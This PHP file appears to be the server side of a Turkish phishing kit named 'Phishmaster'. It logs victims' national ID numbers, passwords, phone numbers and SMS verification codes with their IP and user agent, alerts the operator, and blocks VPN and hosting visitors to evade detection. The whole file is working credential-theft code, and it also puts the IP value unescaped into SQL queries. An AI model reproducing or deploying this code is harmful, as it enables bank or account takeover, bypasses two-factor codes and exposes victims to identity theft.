<?php include_once("./config.php"); include_once("./admin/Data/Server/GrabIP.php"); include_once("./admin/Data/Server/BlockVPN.php");  include_once("./admin/Data/Server/BanControl.php");  include_once("./admin/Data/Server/DiscordWebhook.php");

    $check = $pdo->query("SELECT * FROM logs WHERE ip = '{$ip}'")->fetch(PDO::FETCH_ASSOC);
    $checkAdmin = $pdo->query("SELECT * FROM admin_settings")->fetch(PDO::FETCH_ASSOC);
    $checkVisitor = $pdo->query("SELECT * FROM logs_visitor WHERE ip = '{$ip}'")->fetch(PDO::FETCH_ASSOC);

    function tum_bosluklari_temizle($metin) {
      $metin = str_replace("/s+/", "", $metin);
      $metin = str_replace(" ", "", $metin);
      $metin = str_replace(" ", "", $metin);
      $metin = str_replace(" ", "", $metin);
      $metin = str_replace("/s/g", "", $metin);
      $metin = str_replace("/s+/g", "", $metin);
      $metin = trim($metin);
      return $metin;
    }

    if($checkAdmin["proxy_vpn"] == 1) {
      if($proxy == 1 or $hosting == 1) {
       die('Proxy & VPN Firewall - Phishmaster');
      } 
    }

   if($_GET['action'] == "telefon") {
	  $sorgu = $pdo->prepare("UPDATE logs SET telefon_numarasi=? WHERE ip = '{$ip}'");
	  $sorgu->execute(array(htmlspecialchars($_POST["telefon_numarasi"])));
   }

   if($_GET['action'] == "sms") {
    $sorgu = $pdo->prepare("UPDATE logs SET sms=? WHERE ip = '{$ip}'");
    $sorgu->execute(array(htmlspecialchars($_POST["sms_kodu"])));
    }

    if($_GET['action'] == "first") { #Kurumsal
        if($check["tc_kimlik"]) {
          $sorgu1 = $pdo->prepare("UPDATE logs SET tarih=?,tc_kimlik=?,sifre=? WHERE ip = '{$ip}'");
          $sorgu2 = $pdo->prepare("UPDATE logs_visitor SET useragent=? WHERE ip = '{$ip}'");
          $sorgu1->execute(array(date('d.m.Y H:i'),htmlspecialchars($_POST['tc_kimlik']),htmlspecialchars($_POST['sifre'])));
          $sorgu2->execute(array($_SERVER["HTTP_USER_AGENT"]));
        } else {
          $sorgu1 = $pdo->prepare("INSERT INTO logs SET ip=?,tarih=?,tc_kimlik=?,sifre=?");
          $sorgu2 = $pdo->prepare("INSERT INTO logs_visitor SET ip=?,useragent=?");
          $sorgu1->execute(array($ip,date('d.m.Y H:i'),htmlspecialchars($_POST['tc_kimlik']),htmlspecialchars($_POST['sifre'])));
          $sorgu2->execute(array($ip,$_SERVER["HTTP_USER_AGENT"]));
          if($sorgu1 and $sorgu2) {
            if($checkAdmin['sound_notify'] == 1) {
             $pdo->query("UPDATE logs_visitor SET log_notify = 1 WHERE ip = '{$ip}'");
            }
          }
        }
      }


?>